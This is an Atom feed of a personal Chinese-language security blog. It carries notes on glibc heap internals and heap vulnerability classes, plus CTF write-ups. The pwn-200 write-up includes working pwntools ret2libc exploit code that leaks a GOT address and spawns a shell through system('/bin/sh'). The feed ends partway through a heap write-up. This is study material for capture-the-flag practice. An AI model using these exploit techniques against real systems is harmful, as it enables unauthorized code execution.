<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Brubbish&#39;s</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://brubbish.github.io/"/>
  <updated>2020-11-30T09:35:06.296Z</updated>
  <id>https://brubbish.github.io/</id>
  
  <author>
    <name>Bruce</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>堆</title>
    <link href="https://brubbish.github.io/21992.html"/>
    <id>https://brubbish.github.io/21992.html</id>
    <published>2020-12-01T11:20:18.886Z</published>
    <updated>2020-11-30T09:35:06.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h1><h2 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>程序malloc出的内存称为chunk，在ptmalloc内部用下面的结构体表示，内存空间释放后被加入空闲管理列表。一个chunk不论是分配还是释放，结构都相同。</p><p>malloc_chunk结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* 前一个chunk（物理相连，较低地址）的大小，包括chunk头（如果前一个chunk空闲），否则可以储存前一个chunk的数据，此时这个域的这个字段无效（chunk的空间复用）  */</span></span><br><span class="line">  INTERNAL_SIZE_T      <span class="built_in">size</span>;        <span class="comment">/* 该chunk的大小，为2*size的整数倍（size=4或8，32或64位 </span></span><br><span class="line"><span class="comment">                                    该字段的低3位与大小无关，从高到低 表示“是否属于主线程”、“是否是由mmap分配”、“是否被分配”*/</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/*chunk处于分配状态时从fd开始的字段为用户数据</span></span><br><span class="line"><span class="comment">  struct malloc_chunk* bk;         chunk处于空闲时fd指向前一个空闲的chunk的指针，bk指向后一个空闲的chunk指针(非物理相连)*/</span></span><br><span class="line">                                    </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span>         <span class="comment">/*只有chunk空闲时才使用，用于较大的chunk</span></span><br><span class="line"><span class="comment">  struct malloc_chunk* bk_nextsize;         指向与当前chunk大小不同的第一个空闲块*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>一般chunk size表示malloc_chunk的实际大小，而chunk unused size 表示该chunk中除了prev_size、size、fd等辅助成员外的实际大小</p><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>bin是由chunk结构体组成的链表，按照chunk的大小来管理free后的chunk</p><p>bin链主要有以下几类，其中只有fast bin是单链表，其他都是双向链表。<br>对于small bins，large bins，unsorted bins来说，ptmalloc将它们维护在同一个数组中，对应的数据结构在malloc_state中   </p><h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><p>不属于bins，是ptmalloc单独管理小堆块的数据结构，如果free的chunk大小在0x20~0x80，会优先进入fastbin<br>采用LIFO，用于较小的内存块。当用户需要的chunk大小小于ptmalloc的最大大小时，ptmalloc先判断fastbin中是否有对应大小的空闲块。<br>fastbin中的chunk的inuse始终置为1，不会与其他chunk合并。但如果相邻的chunk合并后的大小大于某个值（FASTBIN_CONSOLIDATION_THRESHOLD），就需要把fastbin中的chunk合并（内存碎片）</p><p>fastbinsY数组中每个fastbin元素指向该链表的尾节点，尾节点通过fd指针指向前一个节点</p><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>采用FIFO，有62个循环双向链表，每个下标对应的chunk大小都一致，关系为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x(下标)   2*4*x(32位)2*8*x(64位)</span><br></pre></td></tr></table></figure><br>其中每个链表都有链表头结点<br>fastbin与smallbin中的chunk的大小有很大一部分会重合，fastbin中的chunk很有可能被放到smallbin中</p><h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>包括63个bin，每个bin中的chunk大小不一致。将63个bin分成6组，每组bin中的chunk大小的公差（最大-最小）一致</p><div class="table-container"><table><thead><tr><th>组</th><th>数量</th><th>公差</th></tr></thead><tbody><tr><td>1</td><td>32</td><td>64B</td></tr><tr><td>2</td><td>16</td><td>512B</td></tr><tr><td>3</td><td>8</td><td>4096B</td></tr><tr><td>4</td><td>4</td><td>32768B</td></tr><tr><td>5</td><td>2</td><td>262144B</td></tr><tr><td>6</td><td>1</td><td>不限制</td></tr></tbody></table></div><p>其中所有chunk按照从大到小排列</p><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>采用FIFO<br>可以视作空闲chunk回归所属bin前的缓冲区<br>unsorted bin只有一个链表。<br>其中的chunk处于乱序状态，主要有两个来源：</p><ul><li>较大的chunk被分割后，剩下的部分大于minsize</li><li>释放一个不属于fastbin的chunk，并且该chunk不与top chunk相邻</li></ul><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>程序第一次进行malloc时，heap会被分为两块，其中一块就是top chunk。top chunk即当前堆的物理地址最高的chunk，不属于任何一个bin，只用于在所有bin不满足请求大小时进行分配（如果大小满足），然后将剩下的部分作为top chunk，否则就对heap进行扩展然后再分配（原来的top_chunk紧接着进入unsorted bin，这里可能产生漏洞），在main_arena中通过sbrk扩展，在thread_arena中通过mmap扩展。<br>topchunk的prev_inuse位始终为1</p><h3 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h3><p>当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，再将该新的chunk变成新的last remainder chunk</p><p>此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：前者分配给用户，剩下的部分放到unsorted bin中，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性。</p><h2 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h2><p>在glibc malloc中针对堆管理，主要涉及到以下3种数据结构：</p><ul><li>heap_info: 即Heap Header，因为一个thread arena（注意：不包含main thread）可以包含多个heaps，所以为了便于管理，就给每个heap分配一个heap header。在当前heap不够用的时候，malloc会通过系统调用mmap申请新的堆空间，新的堆空间会被添加到当前thread arena中，便于管理。</li><li>malloc_state: 即Arena Header，每个thread只含有一个Arena Header。Arena Header包含bins的信息、top chunk以及最后一个remainder chunk等</li><li>malloc_chunk: 即Chunk Header，一个heap被分为多个chunk，至于每个chunk的大小，这是根据用户的请求决定的，也就是说用户调用malloc(size)传递的size参数“就是”chunk的大小.每个chunk都由一个结构体malloc_chunk表示</li></ul><h3 id="Arena"><a href="#Arena" class="headerlink" title="Arena"></a>Arena</h3><p>一个线程只有一个arena，各个线程的arena都是独立的。   </p><p>每个程序中的arena数量是有限制的，与和核心数量有关，因此不是每个线程都会有独立的arena。另外，如果线程数大于核心数的两倍，就必然有线程处于等待状态，所以没有必要都分配独立的arena</p><p>主线程的arena称为main_arena；子线程的称为thread_arena。   </p><p>与 thread arena 不同，main arena 的 arena header（state） 不是保存在通过 sbrk 申请的堆段里，而是作为一个全局变量，可以在 libc.so 的数据段中找到</p><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap info"></a>heap info</h3><p>专门为mmap申请的内存（memory mapping segment)准备的，用来记录堆的信息和链接结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Main arena 无需维护多个堆，因此也无需 heap_info。当空间耗尽时，与 thread arena 不同，main arena 可以通过 sbrk 拓展堆段，直至堆段「碰」到内存映射段；</span><br></pre></td></tr></table></figure></p><p>结构的记录的信息包括：</p><ul><li>堆对应的arena的地址</li><li>上一个heap_info的地址</li><li>当前堆的大小</li><li>用于对齐</li></ul><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>用于管理堆，记录每个arena当前申请的所有内存的具体状态。</p><p>无论是main arena还是thread arena，都只有一个malloc state结构。对于main arena，这个结构是一个全局变量，放在libc.so的数据段中；对于thread arena，这个结构会放在最新申请的arena中</p><h1 id="malloc的时候做了什么"><a href="#malloc的时候做了什么" class="headerlink" title="malloc的时候做了什么"></a>malloc的时候做了什么</h1><p>（以__int_malloc为例）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">malloc寻找堆块的顺序:</span><br><span class="line">1. 在fastbin中寻找有没有对应的chunk</span><br><span class="line">2. 请求大小为small bin范围，在small bin中寻找有没有对应的chunk</span><br><span class="line">3. 考虑是否是large bin，调用malloc_consolidate合并fastbin</span><br><span class="line"></span><br><span class="line">（↓进入大循环↓）</span><br><span class="line">4. 在unsorted bin中寻找有没有合适的chunk</span><br><span class="line">  如果小于unsortedbin，就对unsortedbin进行切割；如果不满足请求的大小，先进行place in order整理 ，然后进行下一步</span><br><span class="line">5. 在large bin中寻找有没有合适的chunk</span><br><span class="line">  （large bin中的堆块不会进行切割，不满足就到topchunk切割）</span><br><span class="line">（--大循环结束--最多迭代10000次）</span><br><span class="line"></span><br><span class="line">6. 寻找较大的bin链中有没有合适的chunk</span><br><span class="line">&#x2F;&#x2F;?</span><br><span class="line"></span><br><span class="line">7. 寻找top_chunk</span><br><span class="line">8. top_chunk不够用，调用malloc_consolidate合并fastbin</span><br><span class="line">9. top_chunk不够用，系统调用再次申请内存</span><br></pre></td></tr></table></figure><ul><li>大循环<br>__int_malloc的大循环主要用来处理unsorted bin如果整个循环没有找到合适的bin，说明所有的unsorted bin的大小都不满足要求如果经过了10000次的循环，所有的unsorted bin中的bin都被放入了对应的bin中，即small bin放入对应的index中，large bin排好序后放入对应的index中</li></ul><ul><li>malloc_consolidate：用于将fastbin中的chunk合并，清空fastbin。<br>先尝试向后合并，然后尝试向前合并：<br>如果向前相邻topchunk则直接合并，如果不相邻则尝试向前合并后插入unsortedbin， 然后获取下一个空闲的chunk，直到fastbin清空</li></ul><h1 id="free的时候又发生了什么"><a href="#free的时候又发生了什么" class="headerlink" title="free的时候又发生了什么"></a>free的时候又发生了什么</h1><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><p>只有一个参数，为需要free的地址<br>判断是否hook了（有则执行free_hook，结束free）、free的地址为NULL（直接返回、如果内存是mmap得到的则进行munmap_chunk()，否则执行_int_free</p><h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h3><p>///?????未完</p><h4 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h4><ol><li>不能指向非法地址</li><li>指针对齐2*SIZE_SZ（32位下=4；64位下=8）</li><li>free的空间大小小于限制最小的chunk</li></ol><p>如果检查没有问题就继续进行判断</p><h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><p>如果bin在fastbin范围里就插入fastbin头部</p><h3 id="free-hook-未完？"><a href="#free-hook-未完？" class="headerlink" title="free_hook//未完？"></a>free_hook//未完？</h3><p>判断是否有用户自定义的函数，如果有就执行，然后结束堆释放</p><ul><li><strong>__free_hook漏洞</strong>：如果将__free_hook变为一个system的地址，那么就可以执行这个system的地址</li></ul><h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><p>glibc2.26后引入的技术，提升堆管理的性能，也舍弃了很多安全检查</p><p>引入了两个结构体”tcache_entry”和”tcache_perthread_struct”</p><ul><li><p><strong>tcache_entry</strong>用单向链表的方式连接大小相同的空闲chunk结构体；</p></li><li><p>每个线程会维护一个<strong>tcache_perthread_struct</strong>，作为tcache的管理结构，维护tcache_max_bin个计数器和tcache_max_bins项tcache_entry，规定每条tcache_entry最多有七个chunk</p></li></ul><h3 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h3><ul><li>第一次 malloc 时，会先 malloc 一块内存用来存放 tcache_prethread_struct 。</li><li>free 内存，且 size 小于 small bin size 时</li><li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）<br>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li><li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li><li>malloc 内存，且 size 在 tcache 范围内<ul><li>先从 tcache 取 chunk，直到 tcache 为空</li><li>tcache 为空后，从 bin 中找</li><li>tcache 为空时，如果 fastbin/smallbin/unsorted bin 中有 size 符合的 chunk，会先把 fastbin/smallbin/unsorted bin 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li></ul></li></ul><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://blog.csdn.net/qq_17713935/article/details/86231502" target="_blank" rel="noopener">https://blog.csdn.net/qq_17713935/article/details/86231502</a>   </p><p><a href="https://zhuanlan.zhihu.com/p/24753861" target="_blank" rel="noopener">Linux堆内存管理深入分析（上）</a><br><a href="https://zhuanlan.zhihu.com/p/24790164" target="_blank" rel="noopener">Linux堆内存管理深入分析（下）</a></p><p><a href="https://zhuanlan.zhihu.com/p/77316206" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/77316206</a><br>定位子线程chunk的技巧：</p><ol><li>向子线程的堆块输入特殊值:”0xdeadbeef”</li><li>在gdb使用 search -4 0xdeadbeef</li><li>搜索出来的地址即堆的地址</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆相关数据结构&quot;&gt;&lt;a href=&quot;#堆相关数据结构&quot; class=&quot;headerlink&quot; title=&quot;堆相关数据结构&quot;&gt;&lt;/a&gt;堆相关数据结构&lt;/h1&gt;&lt;h2 id=&quot;微观结构&quot;&gt;&lt;a href=&quot;#微观结构&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>堆漏洞</title>
    <link href="https://brubbish.github.io/29281.html"/>
    <id>https://brubbish.github.io/29281.html</id>
    <published>2020-12-01T11:20:18.881Z</published>
    <updated>2020-11-30T08:17:30.793Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><p>向某个堆块写入的字节数超过了可用字节数（堆管理器会对用户申请的字节数进行调整，可用字节数可能大于申请的字节数），数据溢出到下一个（物理相邻的高地址）堆块上</p><p><strong>利用策略</strong>：</p><ul><li>1.覆盖下一个chunk的内容</li><li>2.利用堆中的机制如unlink，实现任意地址写入或者控制堆块中的内容</li></ul><h2 id="几个重要步骤"><a href="#几个重要步骤" class="headerlink" title="几个重要步骤"></a>几个重要步骤</h2><ol><li>寻找堆分配函数：malloc、calloc、realloc（根据参数size的不同，实现分配和释放的功能）<br>malloc不能初始化分配的空间，可能遗留上一次释放前的数据；calloc会把分配空间的每一位都初始化为空</li><li>寻找危险函数（输入输出、字符串操作）</li><li>确定填充长度（注意对齐以及可能借用下一chunk的pre_size）</li></ol><h2 id="Off-By-One-堆"><a href="#Off-By-One-堆" class="headerlink" title="Off-By-One(堆)"></a>Off-By-One(堆)</h2><p>指溢出了一个字节（单字节缓冲区溢出）</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>修改堆大小使堆块结构出现重叠，泄露其他数据或者覆盖其他数据</li><li>使prev_in_use位清零，这时前块会被认为是空闲的<ol><li>unlink</li><li>伪造prev_size造成堆块之间的重叠（前提是unlink的时候没有检查按prev_size找到的块和prev_size大小是否一致</li></ol></li></ol><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><p>主要有这两种情况：</p><ul><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">释放后没有被置为NULL的指针称为dangling pointer（悬空指针）</span><br><span class="line">没有初始化的指针称为wild pointer（野指针）</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆溢出&quot;&gt;&lt;a href=&quot;#堆溢出&quot; class=&quot;headerlink&quot; title=&quot;堆溢出&quot;&gt;&lt;/a&gt;堆溢出&lt;/h1&gt;&lt;p&gt;向某个堆块写入的字节数超过了可用字节数（堆管理器会对用户申请的字节数进行调整，可用字节数可能大于申请的字节数），数据溢出到下一个（物
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>xctf栈溢出wp</title>
    <link href="https://brubbish.github.io/51845.html"/>
    <id>https://brubbish.github.io/51845.html</id>
    <published>2020-12-01T11:20:13.422Z</published>
    <updated>2020-12-01T06:17:12.079Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn-200"></a>pwn-200</h2><p>写这题的时候有半个多月没有接触栈溢出了…算是拿这题复习一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec b</span><br><span class="line">[*] <span class="string">'/home/pluto/Desktop/b'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>用ROPgadget搜索没有发现system和/bin/sh，于是猜到大概是要ret2libc</p><p>ida打开，程序很简单:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+2Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+30h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+34h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+38h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+3Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+44h] [ebp-54h]</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="number">1668048215</span>;</span><br><span class="line">  v2 = <span class="number">543518063</span>;</span><br><span class="line">  v3 = <span class="number">1478520692</span>;</span><br><span class="line">  v4 = <span class="number">1179927364</span>;</span><br><span class="line">  v5 = <span class="number">892416050</span>;</span><br><span class="line">  v6 = <span class="number">663934</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v7, <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, (<span class="keyword">char</span> *)&amp;buf);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, &amp;buf, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf));</span><br><span class="line">  sub_8048484();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_8048484</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">256u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现sub_8048484()存在栈溢出</p><p>复习一下找libc版本—&gt;getshell的步骤：</p><ol><li>用puts、write、printf之类的函数打印出某个函数的got，同时要控制好打印后的返回地址</li><li>获得libc的版本、system函数，/bin/sh的地址等，并计算在plt中的位置</li><li>构造payload</li></ol><p>这题我们使用write()打印出write.got：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">addr_out = <span class="string">'a'</span>*<span class="number">112</span> + p32(write_plt) + p32(<span class="number">0x080483D0</span>) + p32(<span class="number">1</span>) + p32(write_got) +p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#1+write_got+4==write(..,..,..)</span></span><br><span class="line"><span class="comment">#返回地址为程序入口地址</span></span><br><span class="line">p.sendlineafter(<span class="string">'\n'</span>, addr_out)</span><br><span class="line">a = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">write_got_addr =  a</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(write_got_addr)</span><br></pre></td></tr></table></figure><br>这里提示一下，“p32(1) + p32(write_got) +p32(4)”构造的是一个write函数的参数，之前看别人的wp想了好久1和4是啥…太蠢了</p><p>用低12位搜索libc的时候注意，查看的是16进制的地址，别再在这卡一个晚上了…将地址和偏移地址进行计算的时候不用转成16进制（str和int的问题）</p><p>后续的代码：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">write_off = <span class="number">0x0d43c0</span></span><br><span class="line">sys_off = <span class="number">0x03a940</span></span><br><span class="line">binsh_off = <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line">base = write_got_addr - write_off</span><br><span class="line">sys = sys_off + base</span><br><span class="line">binsh = binsh_off + base</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">112</span> + p32(sys) + p32(<span class="number">1</span>) + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><br>这个payload比较简短，看到另一种做法如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#第一次结束后返回start的地址</span></span><br><span class="line"></span><br><span class="line">ppp_addr=<span class="number">0x0804856c</span></span><br><span class="line"><span class="comment">#三次pop指令的地址</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">payload2 =<span class="string">'A'</span>*junk+p32(read_plt)+p32(ppp_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress</span></span><br><span class="line"><span class="comment">#read(0,bss_addr,8)把'/bin/sh'读到bss段上，因为bss段可执行</span></span><br><span class="line">payload2+=p32(sys_addr)+p32(func_addr)+p32(bss_addr)</span><br><span class="line"><span class="comment">#用三次pop把指针指向了systemAddress，此时调用system()函数，再栈溢出把bss段上的内容('/bin/sh')当作参数传给system()调用</span></span><br><span class="line">r.send(payload2)</span><br><span class="line">r.send(<span class="string">'/bin/sh'</span>)</span><br></pre></td></tr></table></figure><p>思路值得学习</p><h1 id=""><a href="#" class="headerlink" title="#"></a>#</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;pwn-200&quot;&gt;&lt;a href=&quot;#pwn-200&quot; class=&quot;headerlink&quot; title=&quot;pwn-200&quot;&gt;&lt;/a&gt;pwn-200&lt;/h2&gt;&lt;p&gt;写这题的时候有半个多月没有接触栈溢出了…算是拿这题复习一下&lt;/p&gt;
&lt;figure class=&quot;h
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>xctf堆溢出wp</title>
    <link href="https://brubbish.github.io/61126.html"/>
    <id>https://brubbish.github.io/61126.html</id>
    <published>2020-12-01T11:20:13.420Z</published>
    <updated>2020-12-01T10:02:02.349Z</updated>
    
    <content type="html"><![CDATA[<h2 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time_formatter"></a>time_formatter</h2><p>接触到的第一个堆漏洞题</p><p>首先checksec：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec 5</span><br><span class="line">[*] <span class="string">'/home/pluto/Desktop/5'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure></p><blockquote><p>（开启了FORTIFY_SOURCE对格式化字符串有两个影响：<br>1.包含%n的格式化字符串不能位于程序内存中的可写地址。<br>2.当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。）</p></blockquote><p>运行程序&amp;ida-f5：<br>主函数是一个选择菜单，修改函数名后如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span 